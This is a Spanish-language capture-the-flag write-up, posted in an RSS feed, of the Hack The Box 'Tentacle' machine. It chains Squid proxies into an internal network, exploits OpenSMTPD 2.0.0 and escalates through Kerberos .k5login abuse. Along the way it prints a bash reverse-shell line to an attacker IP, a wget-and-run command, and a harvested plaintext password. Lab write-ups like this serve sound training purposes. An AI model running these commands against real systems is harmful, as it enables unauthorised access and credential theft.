<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Wed, 04 Sep 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;DNS Enumeration (dnsenum)&lt;/li&gt;
&lt;li&gt;SQUID Proxy&lt;/li&gt;
&lt;li&gt;WPAD Enumeration&lt;/li&gt;
&lt;li&gt;OpenSMTPD v2.0.0 Exploit&lt;/li&gt;
&lt;li&gt;SSH using Kerberos (gssapi)&lt;/li&gt;
&lt;li&gt;Abusing .k5login file&lt;/li&gt;
&lt;li&gt;Abusing krb5.keytab file&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Primero el ping de siempre a la IP de la  maquina victima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ping -c 1 10.10.10.224 
PING 10.10.10.224 (10.10.10.224) 56(84) bytes of data.
64 bytes from 10.10.10.224: icmp_seq=1 ttl=63 time=133 ms

--- 10.10.10.224 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 133.304/133.304/133.304/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Iniciamos nuestro escaneo de puertos con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sS -p- --open --min-rate 4000 -n -Pn 10.10.10.224 -oG nmap

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
3128/tcp open  squid-http

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Copiamos los puertos en la clipboard para realizar escaneo de versiones:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ports=&quot;$(cat nmap | grep -oP &apos;\d{1,5}/open&apos; | awk &apos;{print $1}&apos; FS=&apos;/&apos; | xargs | tr &apos; &apos; &apos;,&apos;)&quot;; ip_address=&quot;$(cat nmap | grep -oP &apos;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&apos; | sort -u | head -n 1)&quot;; echo -e &quot;\n[*] Extracting information...\n&quot; &amp;gt; extractPorts.tmp; echo -e &quot;\t[*] IP Address: $ip_address&quot; &amp;gt;&amp;gt; extractPorts.tmp; echo -e &quot;\t[*] Open ports: $ports\n&quot; &amp;gt;&amp;gt; extractPorts.tmp; echo $ports | tr -d &apos;\n&apos; | xclip -sel clip; echo -e &quot;[*] Ports copied to clipboard\n&quot; &amp;gt;&amp;gt; extractPorts.tmp; cat extractPorts.tmp; rm extractPorts.tmp


*] Extracting information...

        [*] IP Address: 10.10.10.224
        [*] Open ports: 22,53,88,3128

[*] Ports copied to clipboard

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;nmap -p22,53,88,3128 -sVC 10.10.10.224 -Pn

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2024-08-06 19:10:40Z)
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.11
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Los puertos abiertos que se muestran son &lt;code&gt;22 SSH&lt;/code&gt;, &lt;code&gt;53 DNS&lt;/code&gt;, &lt;code&gt;88 Kerberos&lt;/code&gt; y &lt;code&gt;3128 HTTP-Proxy&lt;/code&gt;. Nmap ya nos da el dominio de la máquina &lt;code&gt;REALCORP.HTB&lt;/code&gt;. SSH normalmente no es tan interesante, así que comencemos nuestra enumeración con DNS.&lt;/p&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;h2&gt;Port 53 - DNS&lt;/h2&gt;
&lt;p&gt;Para la enumeración de DNS voy a utilizar la herramienta dnsenum. Como ya conocemos el dominio, podemos utilizar esta herramienta para buscar nuevos subdominios.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dnsenum --threads 100 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos dos subdominios interesantes &lt;code&gt;proxy y wpad&lt;/code&gt; Sin embargo, al observar la dirección, parecen ser direcciones internas que el servidor DNS filtró accidentalmente. Todavía podemos agregar estas entradas a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;. Continuaremos nuestra enumeración mirando &lt;code&gt;Squid&lt;/code&gt; (que se ejecuta en el puerto 3128).&lt;/p&gt;
&lt;h2&gt;Port 3128 - HTTP-Proxy (Squid)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos información valiosa de esta página de error:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un nombre de usuario &lt;code&gt;j.nakazawa&lt;/code&gt; (y dominio, si no lo supiéramos ya)&lt;/li&gt;
&lt;li&gt;Hora actual en la máquina (Importante, si trabajamos con Kerberos)&lt;/li&gt;
&lt;li&gt;Otro subdominio &lt;code&gt;srv01.realcorp.htb&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Versión calamar &lt;code&gt;4.11&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Agreguemos todos los host a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10.10.10.224    srv01.realcorp.htb realcorp.htb
10.197.243.31   wpad.realcorp.htb
10.197.243.77   ns.realcorp.htb proxy.realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A continuación, intentemos acceder a la red interna (10.197.243.0) mediante cadenas proxy. Para esto tenemos que editar nuestra configuración de proxychains:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nano /etc/proxychains.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos el proxy externo a nuestra configuración de cadenas de proxy, por lo que todo el tráfico que pasa por el túnel del proxy pasará por el proxy Squid.&lt;/p&gt;
&lt;p&gt;hagamos un mapeo del proxy externo al salir del túnel (lado LAN del proxy).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n 127.0.0.1

Host discovery disabled (-Pn). All addresses will be marked &apos;up&apos; and scan times will be slower.
Nmap scan report for 127.0.0.1
Host is up (0.46s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al escanear la interfaz interna del proxy externo, obtenemos dos puertos adicionales: &lt;code&gt;464 y 749.&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Accessing internal resources&lt;/h3&gt;
&lt;p&gt;Al acceder al proxy externamente, la configuración del proxy puede definir a qué recursos se puede acceder desde el exterior.&lt;/p&gt;
&lt;p&gt;Intentemos ver si tenemos acceso al proxy interno, que según DNS es &lt;code&gt;proxy.realcorp.htb (10.197.243.77)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -p 3128 10.197.243.77

PORT     STATE    SERVICE
3128/tcp filtered squid-http
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;No obtenemos acceso al servidor proxy interno desde el exterior. Intentemos enrutar a través de la interfaz interna del proxy.&lt;/p&gt;
&lt;p&gt;Aquí hay un esquema simplificado para explicar lo que estoy tratando de lograr:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La línea negra nos muestra el acceso al proxy externamente desde nuestra máquina. La línea roja muestra que no es posible el acceso directo al proxy interno desde el exterior. La línea azul nos muestra haciendo proxy a través de la interfaz interna del proxy, antes de continuar con el proxy interno.&lt;/p&gt;
&lt;p&gt;Para hacer esto, debemos agregar a nuestra ProxyList:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nano /etc/proxychains.conf 

http 10.10.10.224 3128 
http 127.0.0.1 3128 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora deberíamos poder acceder al proxy interno (10.197.243.77).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -p 3128 10.197.243.77
Nmap scan report for 10.197.243.77
Host is up (0.16s latency).

PORT     STATE SERVICE
3128/tcp open  squid-http
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;agreguemos este proxy a nuestra cadena.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nano /etc/proxychains.conf 

http 10.10.10.224 3128 
http 127.0.0.1 3128 
http 10.197.243.77 3128
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora deberíamos poder acceder a la red interna.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;WPAD server&lt;/h2&gt;
&lt;p&gt;Ahora que tenemos acceso a la red interna, deberíamos poder escanear el servidor wpad en busca de puertos abiertos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 -q nmap -sT -Pn -n 10.197.243.31
Nmap scan report for 10.197.243.31
Host is up (0.22s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Intentemos acceder al sitio web.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains firefox wpad.realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;al conectarnos a wpad.realcorp.htb, obtenemos un 403 Prohibido.&lt;/p&gt;
&lt;h3&gt;Investigacion de WPAD&lt;/h3&gt;
&lt;p&gt;Al investigar cómo funciona WPAD, encontré esta página web que dice lo siguiente:&lt;/p&gt;
&lt;p&gt;https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks&lt;/p&gt;
&lt;p&gt;“Muchos navegadores utilizan el descubrimiento automático de proxy web (WPAD) para cargar la configuración del proxy desde la red. Un servidor WPAD proporciona configuraciones de proxy del cliente a través de una URL particular (por ejemplo, http://wpad.example.org/wpad.dat)…”&lt;/p&gt;
&lt;p&gt;Intentemos obtener este archivo wpad.dat del servidor.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q curl wpad.realcorp.htb/wpad.dat
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, &quot;realcorp.htb&quot;))
        return &quot;DIRECT&quot;;
    if (isInNet(dnsResolve(host), &quot;10.197.243.0&quot;, &quot;255.255.255.0&quot;))
        return &quot;DIRECT&quot;; 
    if (isInNet(dnsResolve(host), &quot;10.241.251.0&quot;, &quot;255.255.255.0&quot;))
        return &quot;DIRECT&quot;; 
 
    return &quot;PROXY proxy.realcorp.htb:3128&quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al observar el archivo wpad.dat, podemos ver que hay otra subred previamente desconocida &lt;code&gt;10.241.251.0/24&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Podemos usar nslookup para hacerlo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;man nslookup
DESCRIPTION
	Nslookup is a program to query Internet domain name servers.  Nslookup has two modes: interactive and
    non-interactive. [...] Non-interactive mode is used to print just the name and requested information for a host or domain.
[...]
RETURN VALUES
    nslookup returns with an exit status of 1 if any query failed, and 0 otherwise.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos usar la siguiente sintaxis para verificar si existe un host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nslookup 10.241.251.X 10.10.10.224
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si el código de salida no es cero, el host no existe.&lt;/p&gt;
&lt;p&gt;Podemos implementar esto con un script bash:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
DNS_SERVER=&quot;10.10.10.224&quot;
IP_RANGE=&quot;10.241.251&quot;

for HOST in $(seq 1 254);
 do
   IP=&quot;$IP_RANGE.$HOST&quot;
   nslookup &quot;$IP&quot; $DNS_SERVER 1&amp;gt;&amp;amp;2&amp;gt;/dev/null # Try to resolve IP to a hostname
   if [[ $? -eq 0 ]]; # If nslookup exited with 0, the query was successful = host found
    then
       echo &quot;Host ($IP) found via DNS:&quot;
       nslookup &quot;$IP&quot; $DNS_SERVER # Print info
    fi
 done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutemos el script y veamos si se puede encontrar algún host.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./dns-scan.sh 

Host (10.241.251.113) found via DNS:
113.251.241.10.in-addr.arpa     name = srvpod01.realcorp.htb.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Encontramos con éxito un host: 10.241.251.113 (srvpod01.realcorp.htb). Usemos nmap para encontrar cualquier puerto abierto.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -v 10.241.251.113

Discovered open port 25/tcp on 10.241.251.113
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que el puerto &lt;code&gt;25 (SMTP)&lt;/code&gt; está abierto en el host.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains -q nmap -sT -Pn -n -sC -sV -p 25 10.241.251.113 
Nmap scan report for 10.241.251.113
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que el nombre de host del servidor es &lt;code&gt;smtp.realcorp.htb&lt;/code&gt; y está ejecutando &lt;code&gt;OpenSMTPD (Versión 2.0.0)&lt;/code&gt;. Agreguemos el host a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo nano /etc/hosts
10.10.10.224    srv01.realcorp.htb
10.197.243.31   wpad.realcorp.htb
10.197.243.77   ns.realcorp.htb proxy.realcorp.htb
10.241.251.113  smtp.realcorp.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;busquemos un exploit para OpenSMTPD v2.0.0.&lt;/p&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Explotation&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Buscando en google encontramos un exploit:
https://www.exploit-db.com/exploits/47984&lt;/p&gt;
&lt;p&gt;Vamos a enviarnos una revshell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 1234
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;echo &apos;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.11/1234 0&amp;gt;&amp;amp;1&quot;&apos; &amp;gt; /var/www/html/index.html
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;sudo service apache2 start
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;proxychains python3 47984.py 10.241.251.113 25 &apos;wget 10.10.14.11;bash index.html&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ya tenenos la shell.&lt;/p&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Comencemos enumerando todos los usuarios de la máquina:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@smtp:/home# ls -alh
total 0
drwxr-xr-x. 1 root       root       24 Dec  8 10:56 .
drwxr-xr-x. 1 root       root       96 Dec  8 18:50 ..
drwxr-xr-x. 1 j.nakazawa j.nakazawa 59 Dec  9 12:31 j.nakazawa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que el único usuario de este sistema es &lt;code&gt;j.nakazawa&lt;/code&gt;. Echemos un vistazo a su carpeta de inicio.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@smtp:/home/j.nakazawa# ls -alh
total 16K
drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9 12:31 .
drwxr-xr-x. 1 root       root         24 Dec  8 10:56 ..
lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .bash_history -&amp;gt; /dev/null
-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
-rw-r--r--. 1 j.nakazawa j.nakazawa 3.5K Apr 18  2019 .bashrc
-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8 19:12 .msmtprc
-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -&amp;gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Detectamos un archivo interesante en la carpeta de inicio del usuario: .msmtprc. Este es un archivo de configuración para usar el cliente SMTP. Comprobemos posibles contraseñas.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@smtp:/home/j.nakazawa# cat .msmtprc
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM&amp;gt;6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtenemos las credenciales para el usuario &lt;code&gt;j.nakazawa&lt;/code&gt;:&lt;code&gt;sJB}RM6Z~64_&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Intentemos iniciar sesión en el servidor principal a través de SSH.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh j.nakazawa@10.10.10.224
j.nakazawa@10.10.10.224 password: sJB}RM&amp;gt;6Z~64_
Permission denied, please try again.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que esto no funciona. Sin embargo, el mensaje de error me llama la atención. Nunca antes había visto gssapi-keyex ni gssapi-with-mic. Empecemos a investigar.&lt;/p&gt;
&lt;h2&gt;Investigando la autenticación SSH usando gssapi&lt;/h2&gt;
&lt;p&gt;Después de buscar esto por un tiempo, encontré esta respuesta en serverfault:
https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704&lt;/p&gt;
&lt;p&gt;que habla de que está relacionada con Kerberos. Esto tendría sentido ya que hay varios puertos abiertos relacionados con Kerberos. Continuaremos nuestra investigación para que SSH utilice Kerberos.&lt;/p&gt;
&lt;p&gt;Finalmente, encontré este documento de AWS:
https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html&lt;/p&gt;
&lt;p&gt;que parece describir bastante bien nuestro escenario. Esto indica que tenemos que configurar el archivo /etc/krb5.conf, ejecutar kinit y luego usar ssh -K.&lt;/p&gt;
&lt;h2&gt;Configuración de la autenticación Kerberos&lt;/h2&gt;
&lt;p&gt;Ok, comencemos configurando &lt;code&gt;/etc/krb5.conf&lt;/code&gt;, para esto primero tenemos que instalar &lt;code&gt;krb5-user&lt;/code&gt; (apt install krb5-user).&lt;/p&gt;
&lt;p&gt;El archivo &lt;code&gt;/etc/krb5.conf&lt;/code&gt; debería tener el siguiente aspecto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat /etc/krb5.conf
[libdefaults]
        default_realm = REALCORP.HTB # Change default realm
        
        [...]

[realms]
		# Add realm
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Configuramos la hora, con la hora de la maquina victima:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ntpdate 10.10.10.224
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora deberíamos ejecutar kinit con nuestro usuario.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: sJB}RM&amp;gt;6Z~64_
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si tenemos éxito, deberíamos ver un ticket en el caché, si ejecutamos klist.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
02/23/2021 20:47:48  02/24/2021 20:41:46  krbtgt/REALCORP.HTB@REALCORP.HTB
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;obtenemos un ticket válido que debería permitirnos ingresar mediante SSH a la máquina.&lt;/p&gt;
&lt;h2&gt;SSH using Kerberos&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ssh  j.nakazawa@REALCORP.HTB
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement #2&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Veamos qué usuarios están en el sistema.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /etc/passwd | grep &quot;/bin/.*sh&quot;
root:x:0:0:root:/root:/bin/bash
j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
admin:x:1011:1011::/home/admin:/bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El administrador parece un objetivo interesante... Intentemos encontrar una manera de acceder al administrador.&lt;/p&gt;
&lt;p&gt;Al observar los cronjobs, parece que el usuario administrador ejecuta un script cada minuto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Echemos un vistazo al script log_backup&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que el usuario administrador copia todo desde la carpeta &lt;code&gt;/var/log/squid&lt;/code&gt; a su carpeta de inicio. Luego archiva los dos archivos de registro y los elimina. Como todo se copia, pero solo se eliminan los dos archivos especificados, potencialmente tenemos escritura arbitraria en la carpeta &lt;code&gt;/home/admin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Confirmemos esto comprobando si tenemos acceso de escritura a la carpeta &lt;code&gt;/var/log/squid&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ ls -alh /var/log/
total 1.4M
drwxr-xr-x. 12 root   root   4.0K Feb 23 19:52 .
drwxr-xr-x. 22 root   root   4.0K Dec 24 06:24 ..
drwx-wx---.  2 admin  squid    41 Dec 24 06:36 squid
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que solo el usuario administrador puede leer la carpeta, sin embargo, el grupo squid puede escribir en la carpeta. Revisemos nuestros grupos.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 ~]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Parece que somos parte del grupo de squid, lo que confirma nuestro vector de ataque. La única pregunta que queda es qué queremos escribir en la carpeta. Normalmente, escribiría mi clave ssh en .ssh/authorized_keys. Sin embargo, la autenticación de clave pública está deshabilitada. Mi investigación de Kerberos con SSH reveló que hay una manera de permitir que otros usuarios inicien sesión en su cuenta utilizando un archivo .k5login como se indica en este artículo:
https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html&lt;/p&gt;
&lt;p&gt;“Si desea permitir que otra persona inicie sesión en su cuenta a través de Kerberos, puede agregar su principal de Kerberos a su archivo ~/.k5login. ¡Asegúrate de agregar también el tuyo propio si creas este archivo, ya que de lo contrario no podrás acceder a tu propia cuenta!&lt;/p&gt;
&lt;h2&gt;Privesc al administrador: Explotación del script log_backup&lt;/h2&gt;
&lt;p&gt;tenemos que crear nuestro archivo en /var/log/squid/.k5login y esperar hasta que se copie en la carpeta del administrador. Entonces deberíamos poder utilizar SSH como administrador cuando la tarean cron se ejecute.&lt;/p&gt;
&lt;p&gt;Te recomiendo que lo hagas varias veces, ya que a la primera no va:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
[j.nakazawa@srv01 log]$ echo &quot;j.nakazawa@REALCORP.HTB&quot; &amp;gt; /var/log/squid/.k5login 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Luego nos conectamos por ssh:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh admin@10.10.10.224   
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Aug  8 16:00:02 2024
[admin@srv01 ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtuvimos con éxito un shell como administrador y ahora podemos continuar nuestra búsqueda de un vector privesc para root.&lt;/p&gt;
&lt;p&gt;Ejecutemos un script de enumeración en la máquina, voy a usar LinPeas.sh: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh&lt;/p&gt;
&lt;p&gt;Cuando miramos el resultado del script, nos damos cuenta de dos archivos que pertenecen a la raíz y generalmente no son legibles, pero sí pueden ser leídos por el administrador.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/squid/squid.conf
/etc/krb5.keytab
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El Archivo &lt;code&gt;/etc/krb5.keytab&lt;/code&gt; solo es legible por root y admin.&lt;/p&gt;
&lt;p&gt;Echemos un vistazo mas de cerca al expediente.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[admin@srv01 ~]$ file /etc/krb5.keytab
krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
&lt;/code&gt;&lt;/pre&gt;
